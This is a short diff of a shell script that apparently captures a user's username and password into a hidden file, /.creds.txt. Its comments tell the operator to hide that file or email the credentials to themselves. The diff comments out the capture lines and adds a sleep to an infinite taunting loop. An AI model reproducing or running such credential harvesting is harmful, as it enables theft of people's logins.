@@ -8,8 +8,8 @@ echo
 # so either hide it in a location you create when dropping
 # or use the email section to have them sent to YOU
 
-echo "Nothing sus at all">>/.creds.txt
-echo "$USER:$password">>/.creds.txt
+# echo "Nothing sus at all">>/.creds.txt
+# echo "$USER:$password">>/.creds.txt
 
 # email the creds to YOU
 
@@ -29,5 +29,6 @@ if [ "$key" = "please" ]
       for (( ; ; ))
       do
         echo "YOU DIDN'T SAY THE MAGIC WORD!"
+        sleep 0.1
       done
   fi
